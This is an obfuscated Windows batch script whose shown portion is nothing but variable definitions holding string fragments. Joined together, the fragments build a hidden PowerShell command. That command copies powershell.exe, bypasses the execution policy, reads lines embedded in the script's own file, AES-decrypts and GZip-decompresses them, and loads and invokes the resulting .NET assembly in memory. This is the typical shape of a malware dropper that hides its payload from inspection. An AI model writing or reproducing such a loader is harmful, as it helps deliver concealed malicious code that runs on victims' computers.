@echo off
set "KVMBVLvDbD=Wi"
set "dMvcbNRcAz=do"
set "WwjkhMgSXp=1."
set "OmiTPoOlmn=ll"
set "gUsEquoCWf=ws"
set "KtQjddufNN=\W"
set "NfLZiriwjw=em"
set "wBtHTEzvOA=\v"
set "GkzCQZdels=32"
set "uZwlXUFgRH=s\"
set "lsEnHaIEzy=rS"
set "QrIMszjyvn= C"
set "eGwRWmjEzH=Sy"
set "qFIgrlrrjV=nd"
set "MitJuzyMpr=ll"
set "FAWiEUXqRb=ow"
set "VYmMDdYVSh=0\"
set "SRKRTpINme=:\"
set "KsADIZdZBw=he"
set "fPskNVgpLD=.e"
set "JdvQLQlsUd=y "
set "UrPSyVdCby=xe"
set "jWbEUhxVki= /"
set "VbjQTZUxJF=in"
set "WdJvBFbJIR=Po"
set "eGvGpYYNip=we"
set "AHkazqYjCI=we"
set "LIhLrdMJpH=py"
set "YrEryjZEXb=st"
set "BVphbjYTJe=po"
set "DZeCvOYsvw=co"
set "tGPawyoHeQ=rs"
set "FEDHYagciX=he"
set "KOGwXnlEGn= %~dp0"
set "DliMDrnTWo=cd"
set "INdWlueCQT=;$tC"
set "hftHRDFwdT= = N"
set "EQenivZDlk=saBm"
set "tiZfZBfDas=urit"
set "hrrYZrHZIf=ddin"
set "lBZJJkXcQF=tryP"
set "UuTgDghcPg=m.IO"
set "fknzfLndcZ=7;$e"
set "snJdaAKINm=stem"
set "RCaOHZIUhh=$hPy"
set "JKbgewjPKa=Star"
set "cfPLAhZzYQ=('%*'"
set "ZUbxewNSxf=$pMq"
set "cwgkJsEQHA=form"
set "nyIGlIOeba=oint"
set "jJSdoZGvkk=y.Pa"
set "izHWRsFmYp=tM.I"
set "VaWOIPzJHe=;$cy"
set "qugnPCkARR=ck($"
set "GwzqdFXFkQ=vert"
set "dtFrFgfTWp=::('"
set "vVFpjtXrIZ=HS.T"
set "gyJGJfOUsA=;$dp"
set "DCAWrYCamR=$Qdr"
set "JVwCAqeTZQ=morF"
set "sgjTFQqVGd=nage"
set "pBaTCRojSK=Rcq "
set "TKdFXtmqmN=nirt"
set "FtMOiurPAo=TllA"
set "tvmBJqzmLs=am;$"
set "SQevOZyNiJ=[]] "
set "VdIWCSdDru=BC;$"
set "aIuNbcMdGi=driq"
set "YghyXxCOpg=$pMq"
set "KVSSUMCgxW=oryS"
set "EbEShbHudw=iq);"
set "vqWkXbvORq=Mode"
set "ToPxMfOLgb=:: '"
set "yHVSiKbwhT=iron"
set "uJfbwtmWIV=] -j"
set "RiTnhKFYXM=-ep "
set "kvgYHdcVnO=HS);"
set "VpFYMdETBG=.Cop"
set "RQbnxrcSQS=ose("
set "ZcHqgXiEVi=ress"
set "lxwObpPJdJ=gMod"
set "bRdHxinYKh=O.Me"
set "ZNknPEFDoT=oin "
set "oNFvxcKXuB=736u"
set "YOSjeYigYs=OyzA"
set "WwHjGLPlSp=comm"
set "wMnUigwGGR=ptog"
set "JRgLUgoooL=th('"
set "uSfpneXGzg=Comp"
set "DdnDaWtOeA=rity"
set "fWnFesYmam=ew-O"
set "GCHfyqEFxk== $e"
set "bfmNQQwKHv=7Yiv"
set "jVmjjVSXah=('%~f0'"
set "UIzaZKjiqr=rofi"
set "SRwKTNojjZ=ct S"
set "oKJAuISgnT=..-1"
set "jGYqgMStZD=ke($"
set "VETAvRDqmY=  $m"
set "fdDsyPwAUK== [S"
set "vFzfvztdSv=ay()"
set "pYTscfeyMU=ddin"
set "zxbDWRhAUM=Obje"
set "tjhlhwKNDo=, (,"
set "rCorAlqVid=Qdri"
set "JwzIRILnKz=ZYYc"
set "dzdaWFLxaI=ss -"
set "WUVhCDUCHT=();$"
set "xcBDyTLgDJ=UGTu"
set "LAbejxzVCv= if "
set "lBvuMlkhcv=($Bh"
set "pKSZmDzXyf=q = "
set "GpZMXstRqs=ateD"
set "AfSYblszPV=)($m"
set "lRPvOYTPzg=.Dis"
set "ClKBICiMOC=hy.A"
set "lTmwQHdTaJ=ecry"
set "zLNNLxCFdp=.Cry"
set "GmtdCNAZbj=m(, "
set "EpTCnceFvP=('da"
set "XtJMfljlEt=Fina"
set "nIxgSSTGPg=zHtM"
set "hQgzsMgUzm=oArr"
set "pvkQtMIKth=y) {"
set "OxOdnmXcFU=$pMq"
set "NMiDaabzzR=grap"
set "ngeBWzGBoC= [Sy"
set "UebrzyMgdg=gnir"
set "iesqqEkKxv=flec"
set "nFlMQyDlgf=giH."
set "vjFYPpvobU=Bhgi"
set "bHtSpxYbqk=.Sec"
set "EbjPHjCQiy=-4] "
set "HEdGHnrahy=m.Re"
set "YhYpQSpxCQ=py ="
set "dodkqeGEry= [st"
set "sXfIGRbIKP=]::N"
set "OJhrqHkxwY=bjec"
set "bYTVyxEPRs=)))"
set "ukPNtCLGPv=pDZz"
set "wwBGfYFgaW=M.Pa"
set "zoKhaAFyxV=PKCS"
set "ggWElwucZT=-Obj"
set "rrdIsTFPiN=esMa"
set "hyvdoYkXyN=esFX"
